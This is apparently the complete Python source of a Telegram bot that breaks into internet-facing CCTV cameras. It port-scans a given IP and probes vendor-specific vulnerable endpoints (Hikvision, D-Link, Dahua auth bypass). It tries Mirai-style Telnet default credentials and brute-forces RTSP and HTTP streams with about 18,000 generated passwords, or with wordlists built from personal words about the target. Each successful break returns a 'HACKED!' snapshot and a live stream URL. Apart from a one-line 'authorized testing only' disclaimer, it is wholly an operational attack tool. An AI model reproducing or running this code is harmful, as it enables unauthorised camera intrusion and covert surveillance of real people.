import telebot
import cv2
import numpy as np
import requests
import time
import threading
import os
import logging
import socket
import itertools
import subprocess
import json
import re
import base64
from requests.auth import HTTPBasicAuth, HTTPDigestAuth
from flask import Flask
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from xml.etree import ElementTree as ET

# ====== LOGGING ======
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# ====== ENV ======
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN")
if not TELEGRAM_TOKEN:
    logging.error("❌ TELEGRAM_TOKEN not set!")
    exit(1)

bot = telebot.TeleBot(TELEGRAM_TOKEN)
user_failed_targets = {}

# ====== 1. 18,000+ PASSWORDS (नए ब्रांड्स के साथ) ======
def get_large_passwords():
    passwords = set()
    core = ["admin","12345","123456","password","admin123","root","pass","888888","666666","000000","111111","222222","333333","444444","555555","777777","999999","123123","654321","098765","112233","12345678","123456789","qwerty","abc123","admin@123","Admin@123","P@ssw0rd","welcome","letmein","monkey","dragon","master","hello","superman","iloveyou","dallas","adminadmin","service","operator","guest","support","user","manager"]
    brands = [
        "hik","hikvision","hik123","hik12345","dahua","dahua123","axis","axis123",
        "cp","cpplus","acti","acti123","vivotek","vivotek123","samsung","samsung123",
        "panasonic","panasonic123","sony","sony123","bosch","bosch123","annke","annke123",
        "reolink","reolink123","v380","vstarcam","uniview","unv","tvt","hanwha",
        "geovision","matrix","godrej","bosch","pelco","arecont","mobotix","basler",
        "march","cisco","indigo","dlink","d-link","tp-link","tplink","foscam","amcrest"
    ]
    # Brand + numbers
    for b in brands:
        for i in range(1, 500, 3):
            if len(passwords) >= 18000: break
            passwords.add(f"{b}{i}")
            passwords.add(f"{b}_{i}")
            passwords.add(f"{i}{b}")
            passwords.add(f"{b}@{i}")
    # Pure numbers 1-9999
    for i in range(1, 10000):
        if len(passwords) >= 18000: break
        passwords.add(str(i).zfill(4))
        passwords.add(str(i).zfill(5))
        passwords.add(str(i).zfill(6))
    # Core + brands with years
    for p in core: passwords.add(p)
    for b in brands:
        passwords.add(b)
        for y in ["2024", "2025", "2026", "2023", "2022"]:
            passwords.add(f"{b}{y}")
            passwords.add(f"{b}@{y}")
    # Some special combos
    for b in brands:
        for suffix in ["admin", "pass", "123", "1234", "12345", "123456"]:
            passwords.add(f"{b}{suffix}")
            passwords.add(f"{b}_{suffix}")
    return list(passwords)[:18000]

SMART_PASSWORDS = get_large_passwords()
TOP_USERS = ["admin", "root", "user", "service", "operator", "support", "manager", "guest", "supervisor", "installer"]

# ====== 2. CUSTOM PASSWORD GENERATOR (Retry) ======
def generate_custom_passwords(tokens):
    passwords = set()
    words = tokens.split()
    alphas = [w for w in words if not w.isdigit()]
    nums = [w for w in words if w.isdigit()]
    if not nums: nums = ["1234", "5678", "0000"]
    if not alphas: alphas = ["admin", "user", "root"]
    first_four_digits = []
    for num_str in nums:
        if len(num_str) >= 4:
            first_four_digits.append(num_str[:4])
        else:
            first_four_digits.append(num_str + "0" * (4 - len(num_str)))
    for alpha in alphas:
        for digit in first_four_digits:
            passwords.add(f"{alpha}{digit}")
            passwords.add(f"{digit}{alpha}")
            passwords.add(f"{alpha.capitalize()}{digit}")
            passwords.add(f"{alpha.upper()}{digit}")
            passwords.add(f"{alpha}{digit}@")
            passwords.add(f"{alpha}@{digit}")
            passwords.add(f"{alpha}_{digit}")
            for special in ["@", "#", "!", "_"]:
                passwords.add(f"{alpha}{special}{digit}")
                passwords.add(f"{digit}{special}{alpha}")
    if len(alphas) >= 2:
        for a1, a2 in itertools.permutations(alphas, 2):
            passwords.add(f"{a1}{a2}")
            passwords.add(f"{a1.capitalize()}{a2}")
    for d in first_four_digits:
        passwords.add(d)
    for a in alphas:
        passwords.add(a)
        passwords.add(f"{a}123")
        passwords.add(f"{a}@123")
        for y in ["2024", "2025", "2026", "2023"]:
            passwords.add(f"{a}{y}")
    return list(passwords)[:500]

# ====== 3. PORT SCANNER ======
def scan_ports(ip):
    open_ports = []
    common_ports = [80, 443, 554, 8080, 8000, 8001, 8081, 8443, 37777, 23, 21, 22, 8554, 10554, 5000, 5001, 9000]
    for port in common_ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.0)
            res = sock.connect_ex((ip, port))
            sock.close()
            if res == 0:
                open_ports.append(port)
                logging.info(f"✅ Open port: {ip}:{port}")
        except:
            pass
    return open_ports

# ====== 4. ADVANCED FINGERPRINTING (नए ब्रांड्स के साथ) ======
def fingerprint_camera(ip, port):
    brand = "Unknown"
    try:
        url = f"http://{ip}:{port}"
        r = requests.get(url, timeout=3, headers={"User-Agent": "Mozilla/5.0"}, allow_redirects=True)
        server = r.headers.get('Server', '').lower()
        auth = r.headers.get('WWW-Authenticate', '').lower()
        title_match = re.search(r'<title>(.*?)</title>', r.text, re.IGNORECASE)
        title = title_match.group(1).lower() if title_match else ""
        body = r.text[:3000].lower()
        all_text = server + title + body

        # Hikvision
        if any(x in all_text for x in ['hikvision', 'hik', 'dvrdvs', 'isapi']):
            brand = "Hikvision"
        # Dahua
        elif any(x in all_text for x in ['dahua', 'dss', 'magicbox', 'general']):
            brand = "Dahua"
        # Uniview (UNV)
        elif any(x in all_text for x in ['uniview', 'unv', 'netdvr']):
            brand = "Uniview"
        # TVT
        elif any(x in all_text for x in ['tvt', 'dvrdvs']):
            brand = "TVT"
        # Hanwha / Samsung
        elif any(x in all_text for x in ['hanwha', 'samsung', 'techwin']):
            brand = "Hanwha"
        # Panasonic
        elif 'panasonic' in all_text:
            brand = "Panasonic"
        # Bosch
        elif 'bosch' in all_text:
            brand = "Bosch"
        # Sony
        elif 'sony' in all_text:
            brand = "Sony"
        # Vivotek
        elif 'vivotek' in all_text:
            brand = "Vivotek"
        # ACTi
        elif 'acti' in all_text:
            brand = "ACTi"
        # GeoVision
        elif 'geovision' in all_text or 'gv-' in all_text:
            brand = "GeoVision"
        # CP Plus
        elif 'cp plus' in all_text or 'cpplus' in all_text:
            brand = "CP Plus"
        # Matrix
        elif 'matrix' in all_text:
            brand = "Matrix"
        # Godrej
        elif 'godrej' in all_text:
            brand = "Godrej"
        # D-Link
        elif 'd-link' in all_text or 'dlink' in all_text:
            brand = "D-Link"
        # TP-Link
        elif 'tp-link' in all_text or 'tplink' in all_text:
            brand = "TP-Link"
        # V380
        elif 'v380' in all_text or 'vstarcam' in all_text:
            brand = "V380"
        # Reolink
        elif 'reolink' in all_text:
            brand = "Reolink"
        # Foscam
        elif 'foscam' in all_text:
            brand = "Foscam"
        # Amcrest
        elif 'amcrest' in all_text:
            brand = "Amcrest"
        # Axis
        elif 'axis' in all_text:
            brand = "Axis"
        # Generic
        elif any(x in all_text for x in ['cgi-bin', 'snapshot', 'webcam', 'netcam', 'ipcam']):
            brand = "Generic_IP_Camera"
        logging.info(f"🔍 {ip}:{port} → Brand: {brand}")
    except Exception as e:
        logging.debug(f"Fingerprint error: {e}")
    return brand

# ====== 5. ONVIF DISCOVERY (नया) ======
def onvif_discover(ip):
    """Try to get device info via ONVIF on common ports"""
    onvif_ports = [80, 8000, 8080, 8899]
    for port in onvif_ports:
        try:
            url = f"http://{ip}:{port}/onvif/device_service"
            # SOAP request for GetDeviceInformation
            soap = """<?xml version="1.0" encoding="UTF-8"?>
            <s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope">
              <s:Body xmlns:tds="http://www.onvif.org/ver10/device/wsdl">
                <tds:GetDeviceInformation/>
              </s:Body>
            </s:Envelope>"""
            headers = {'Content-Type': 'application/soap+xml; charset=utf-8'}
            r = requests.post(url, data=soap, headers=headers, timeout=3)
            if r.status_code == 200 and "GetDeviceInformationResponse" in r.text:
                # Extract info
                root = ET.fromstring(r.text)
                ns = {'tds': 'http://www.onvif.org/ver10/device/wsdl'}
                manufacturer = root.find('.//tds:Manufacturer', ns)
                model = root.find('.//tds:Model', ns)
                firmware = root.find('.//tds:FirmwareVersion', ns)
                if manufacturer is not None:
                    return {
                        "manufacturer": manufacturer.text,
                        "model": model.text if model is not None else "Unknown",
                        "firmware": firmware.text if firmware is not None else "Unknown",
                        "port": port
                    }
        except:
            pass
    return None

# ====== 6. MANUAL CVE SCANNER (नई CVEs) ======
def check_manual_cves(ip, port, brand):
    try:
        base_url = f"http://{ip}:{port}"
        # Hikvision
        if brand == "Hikvision":
            for path in ["/System/deviceInfo", "/ISAPI/System/deviceInfo", "/cgi-bin/deviceInfo"]:
                try:
                    url = f"{base_url}{path}"
                    r = requests.get(url, timeout=3, auth=HTTPDigestAuth("admin", "12345"))
                    if r.status_code == 200 and ("deviceName" in r.text or "firmware" in r.text):
                        return "CVE-2021-36260 (Hikvision Info Leak)", url
                except: pass
        # D-Link
        elif brand == "D-Link":
            for path in ["/config/getuser?index=0", "/cgi-bin/config_getuser.cgi"]:
                try:
                    url = f"{base_url}{path}"
                    r = requests.get(url, timeout=3)
                    if r.status_code == 200 and ("username" in r.text and "password" in r.text):
                        return "CVE-2025-13607 (D-Link Config Leak)", url
                except: pass
        # Dahua
        elif brand == "Dahua":
            for path in ["/cgi-bin/global.cgi", "/cgi-bin/magicBox.cgi"]:
                try:
                    url = f"{base_url}{path}"
                    headers = {"Cookie": "uid=admin", "Authorization": "Basic YWRtaW46YWRtaW4="}
                    r = requests.get(url, headers=headers, timeout=3)
                    if r.status_code == 200 and ("global" in r.text or "magicBox" in r.text):
                        return "CVE-2025-31700 (Dahua Auth Bypass)", url
                except: pass
        # Uniview
        elif brand == "Uniview":
            for path in ["/cgi-bin/getparam.cgi", "/cgi-bin/deviceInfo.cgi"]:
                try:
                    url = f"{base_url}{path}"
                    r = requests.get(url, timeout=3)
                    if r.status_code == 200 and ("device" in r.text or "model" in r.text):
                        return "Uniview Info Disclosure", url
                except: pass
        # TVT
        elif brand == "TVT":
            for path in ["/cgi-bin/deviceInfo.cgi", "/cgi-bin/getparam.cgi"]:
                try:
                    url = f"{base_url}{path}"
                    r = requests.get(url, timeout=3)
                    if r.status_code == 200 and ("device" in r.text or "model" in r.text):
                        return "TVT Info Disclosure", url
                except: pass
        # Telnet Backdoor
        if port == 23:
            for user, pwd in [("root", "juantech"), ("root", "1111"), ("admin", "admin"), ("root", "vizxv"), ("root", "xc3511")]:
                try:
                    import telnetlib
                    tn = telnetlib.Telnet(ip, timeout=3)
                    tn.read_until(b"login: ")
                    tn.write(user.encode('ascii') + b"\n")
                    tn.read_until(b"Password: ")
                    tn.write(pwd.encode('ascii') + b"\n")
                    result = tn.read_some()
                    tn.close()
                    if b"#" in result or b"$" in result:
                        return f"Telnet Backdoor ({user}/{pwd})", f"telnet://{user}:{pwd}@{ip}"
                except: pass
    except Exception as e:
        logging.debug(f"Manual CVE error {ip}:{port} - {e}")
    return None, None

# ====== 7. INGRAM-PRO INTEGRATION ======
def run_ingram_pro(ip, port):
    try:
        ingram_path = "./Ingram-Pro/run_ingram_pro.py"
        if not os.path.exists(ingram_path):
            return False, None, None
        cmd = ["python3", ingram_path, "-i", f"{ip}:{port}", "-o", "./temp_ingram", "--timeout", "20"]
        subprocess.run(cmd, capture_output=True, text=True, timeout=25)
        if os.path.exists("./temp_ingram/vulnerabilities.json"):
            with open("./temp_ingram/vulnerabilities.json", "r") as f:
                data = json.load(f)
                if data.get("vulnerable", False):
                    return True, data.get("cve_id", "Unknown"), data.get("poc_url", "")
        return False, None, None
    except:
        return False, None, None

# ====== 8. CAMERA ACCESS ENGINE (RTSP + HTTP Basic + Digest) ======
def try_camera_access(ip, port, user, pwd):
    # RTSP paths
    rtsp_paths = [
        "/h264", "/live", "/stream1", "/11", "/cam/realmonitor", "/onvif1",
        "/video", "/stream", "/live/ch00_0", "/ch0", "/h264/ch1/main/av_stream",
        "/cgi-bin/mjpg/video.cgi", "/mpeg4", "/mjpg/video.mjpg"
    ]
    for path in rtsp_paths:
        url = f"rtsp://{user}:{pwd}@{ip}:{port}{path}"
        try:
            cap = cv2.VideoCapture(url, cv2.CAP_FFMPEG)
            cap.set(cv2.CAP_PROP_OPEN_TIMEOUT_MSEC, 2000)
            if cap.isOpened():
                ret, frame = cap.read()
                cap.release()
                if ret and frame is not None:
                    _, buffer = cv2.imencode('.jpg', frame)
                    return True, buffer.tobytes(), url
        except:
            pass

    # HTTP Basic & Digest
    http_urls = [
        f"http://{ip}:{port}/video.cgi",
        f"http://{ip}:{port}/cgi-bin/video.cgi",
        f"http://{ip}:{port}/mjpeg",
        f"http://{ip}:{port}/cgi-bin/snapshot.cgi",
        f"http://{ip}:{port}/snapshot.cgi",
        f"http://{ip}:{port}/image.jpg",
        f"http://{ip}:{port}/capture",
        f"http://{ip}:{port}/cgi-bin/mjpg/video.cgi",
        f"http://{ip}:{port}/axis-cgi/mjpg/video.cgi",
        f"http://{ip}:{port}/onvif-http/snapshot",
        f"http://{ip}:{port}/cgi-bin/snapshot.cgi?channel=1"
    ]
    for url in http_urls:
        # Basic
        try:
            r = requests.get(url, auth=HTTPBasicAuth(user, pwd), timeout=2, stream=True)
            if r.status_code == 200:
                ct = r.headers.get('Content-Type', '')
                if any(x in ct for x in ["image", "multipart", "video", "jpeg", "jpg"]):
                    return True, r.content, url
        except: pass
        # Digest
        try:
            r = requests.get(url, auth=HTTPDigestAuth(user, pwd), timeout=2, stream=True)
            if r.status_code == 200:
                ct = r.headers.get('Content-Type', '')
                if any(x in ct for x in ["image", "multipart", "video", "jpeg", "jpg"]):
                    return True, r.content, url
        except: pass

    return False, None, None

# ====== 9. MAIN SCAN EXECUTION ======
def execute_scan(chat_id, ip, open_ports):
    if not open_ports:
        bot.send_message(chat_id, f"❌ No open CCTV ports found on `{ip}`.", parse_mode='Markdown')
        return

    total = len(open_ports)
    status_msg = bot.send_message(
        chat_id,
        f"⏳ *Scanning `{ip}`...*\n📡 Ports: `{', '.join(map(str, open_ports))}`\n🔍 Testing CVEs + 18,000 passwords...",
        parse_mode='Markdown'
    )

    hacked = []
    failed = []

    # ONVIF Discovery (try once)
    onvif_info = onvif_discover(ip)
    if onvif_info:
        bot.send_message(chat_id, f"📋 *ONVIF Info:* {onvif_info['manufacturer']} {onvif_info['model']} (Firmware: {onvif_info['firmware']})", parse_mode='Markdown')

    for idx, port in enumerate(open_ports):
        try:
            bot.edit_message_text(
                f"⏳ Scanning `{ip}`...\n📡 Progress: {idx+1}/{total}\n🔍 Current Port: `{port}`",
                chat_id=chat_id, message_id=status_msg.message_id, parse_mode='Markdown'
            )
        except: pass

        success = False
        brand = fingerprint_camera(ip, port)

        # --- Phase 1: Manual CVEs ---
        cve_name, poc_url = check_manual_cves(ip, port, brand)
        if cve_name:
            caption = f"🔥 *VULNERABILITY DETECTED!*\n📍 `{ip}:{port}`\n🛡️ *{cve_name}*\n📺 `{poc_url}`"
            bot.send_message(chat_id, caption, parse_mode='Markdown')
            hacked.append({"ip": ip, "port": port, "type": "CVE", "url": poc_url})
            continue

        # --- Phase 2: Ingram-Pro (only first 3 ports) ---
        if idx < 3:
            vuln_found, cve_id, poc_url = run_ingram_pro(ip, port)
            if vuln_found:
                caption = f"🔥 *INGRAM CVE!*\n📍 `{ip}:{port}`\n🛡️ *{cve_id}*\n📺 `{poc_url}`"
                bot.send_message(chat_id, caption, parse_mode='Markdown')
                hacked.append({"ip": ip, "port": port, "type": "Ingram", "url": poc_url})
                continue

        # --- Phase 3: Brute-Force (18,000 passwords) ---
        for user in TOP_USERS:
            if success: break
            for pwd in SMART_PASSWORDS:
                success, img, url = try_camera_access(ip, port, user, pwd)
                if success:
                    caption = (f"✅ *HACKED!*\n📍 `{ip}:{port}`\n🔑 `{user}` / `{pwd}`\n"
                               f"📺 *Live VLC URL:*\n`{url}`\n\n👉 Paste in VLC → Open Network Stream")
                    try:
                        if img:
                            bot.send_photo(chat_id, photo=img, caption=caption, parse_mode='Markdown')
                        else:
                            bot.send_message(chat_id, caption, parse_mode='Markdown')
                    except:
                        bot.send_message(chat_id, caption, parse_mode='Markdown')
                    hacked.append({"ip": ip, "port": port, "type": "Brute", "url": url})
                    break
            if success: break

        if not success:
            failed.append({"ip": ip, "port": port})
            bot.send_message(chat_id, f"❌ Port `{port}` – No access (Secure)", parse_mode='Markdown')

    # Final report
    final_msg = (f"🏁 *Scan Complete!*\n📍 `{ip}`\n✅ Hacked: {len(hacked)}\n❌ Failed: {len(failed)}")
    bot.edit_message_text(final_msg, chat_id=chat_id, message_id=status_msg.message_id, parse_mode='Markdown')

    if failed:
        user_failed_targets[chat_id] = {"ip": ip, "ports": [f['port'] for f in failed]}
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔁 Retry with Custom Words", callback_data="retry_ip"))
        bot.send_message(chat_id, "Retry failed ports with custom passwords?", reply_markup=markup)
    else:
        user_failed_targets[chat_id] = None

# ====== 10. TELEGRAM HANDLERS ======
@bot.message_handler(commands=['start'])
def start(msg):
    bot.reply_to(msg,
        "🛡️ *Pro CCTV IP Hunter (New Brands Edition)*\n\n"
        "🎯 *Direct IP Scanner – No Shodan!*\n\n"
        "✅ Supports: Hikvision, Dahua, Uniview, TVT, Hanwha, Panasonic, Bosch, Sony, Vivotek, ACTi, GeoVision, CP Plus, Matrix, Godrej, D-Link, TP-Link, V380, Reolink, Foscam, Amcrest, Axis, and more!\n\n"
        "📌 Usage: `/scan 103.174.119.5`\n"
        "📌 With port: `/scan 103.174.119.5:80`\n\n"
        "⚠️ For educational & authorized testing only!",
        parse_mode='Markdown')

@bot.message_handler(commands=['scan'])
def scan_ip(msg):
    text = msg.text.replace('/scan', '').strip()
    if not text:
        bot.reply_to(msg, "❌ Provide an IP.\nExample: `/scan 103.174.119.5`", parse_mode='Markdown')
        return

    custom_port = None
    if ':' in text and text.count(':') == 1:
        try:
            ip_part, port_part = text.rsplit(':', 1)
            if port_part.isdigit():
                custom_port = int(port_part)
                text = ip_part
        except: pass

    ip = text.strip()
    parts = ip.split('.')
    if len(parts) != 4:
        bot.reply_to(msg, "❌ Invalid IP format.", parse_mode='Markdown')
        return
    try:
        for p in parts:
            num = int(p)
            if num < 0 or num > 255: raise ValueError
    except:
        bot.reply_to(msg, "❌ Invalid IP address.", parse_mode='Markdown')
        return

    bot.reply_to(msg, f"🔍 *Target:* `{ip}`\n⏳ Scanning ports... (10-15s)", parse_mode='Markdown')

    def run():
        try:
            if custom_port:
                open_ports = [custom_port]
            else:
                open_ports = scan_ports(ip)
            if not open_ports:
                bot.send_message(msg.chat.id, f"❌ No open CCTV ports on `{ip}`.", parse_mode='Markdown')
                return
            execute_scan(msg.chat.id, ip, open_ports)
        except Exception as e:
            bot.send_message(msg.chat.id, f"❌ Error: {e}")

    threading.Thread(target=run, daemon=True).start()

@bot.callback_query_handler(func=lambda call: call.data == "retry_ip")
def retry_callback(call):
    chat_id = call.message.chat.id
    data = user_failed_targets.get(chat_id)
    if not data:
        bot.edit_message_text("❌ No failed ports to retry.", chat_id, call.message.message_id)
        return
    bot.edit_message_text(
        f"📋 *Custom Words Retry*\nTarget: `{data['ip']}`\nFailed Ports: `{', '.join(map(str, data['ports']))}`\n\n"
        f"✍️ Send custom words (space separated):\nExample: `ram delhi 9876543210`",
        chat_id, call.message.message_id, parse_mode='Markdown'
    )
    bot.register_next_step_handler(call.message, process_custom_words)

def process_custom_words(msg):
    chat_id = msg.chat.id
    tokens = msg.text.strip()
    data = user_failed_targets.get(chat_id)
    if not data:
        bot.send_message(chat_id, "❌ No retry data. Send a new /scan.")
        return
    if len(tokens.split()) < 1:
        bot.reply_to(msg, "❌ Send at least 1 word!")
        return
    custom_passwords = generate_custom_passwords(tokens)
    if len(custom_passwords) < 10:
        bot.reply_to(msg, "⚠️ Too few passwords generated. Send more words.")
        return
    bot.reply_to(msg, f"✅ Generated {len(custom_passwords)} custom passwords!\n⏳ Retrying failed ports on `{data['ip']}`...", parse_mode='Markdown')

    def run():
        ip = data['ip']
        for port in data['ports']:
            success = False
            for user in TOP_USERS:
                if success: break
                for pwd in custom_passwords:
                    success, img, url = try_camera_access(ip, port, user, pwd)
                    if success:
                        caption = f"✅ *CRACKED WITH CUSTOM!*\n📍 `{ip}:{port}`\n🔑 `{user}` / `{pwd}`\n📺 `{url}`"
                        try:
                            if img:
                                bot.send_photo(chat_id, photo=img, caption=caption, parse_mode='Markdown')
                            else:
                                bot.send_message(chat_id, caption, parse_mode='Markdown')
                        except:
                            bot.send_message(chat_id, caption, parse_mode='Markdown')
                        break
            if not success:
                bot.send_message(chat_id, f"❌ Still secure: `{ip}:{port}`", parse_mode='Markdown')
        bot.send_message(chat_id, "🏁 *Custom Retry Complete!*", parse_mode='Markdown')

    threading.Thread(target=run, daemon=True).start()

# ====== 11. FLASK (Render) ======
app = Flask(__name__)

@app.route('/')
def home():
    return "🤖 IP-Based CCTV Hunter (New Brands) is Alive!"

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)

def run_bot():
    logging.info("🚀 IP Hunter Bot Started (New Brands Edition)...")
    bot.infinity_polling(skip_pending=True, timeout=20)

if __name__ == "__main__":
    t = threading.Thread(target=run_flask)
    t.daemon = True
    t.start()
    run_bot()
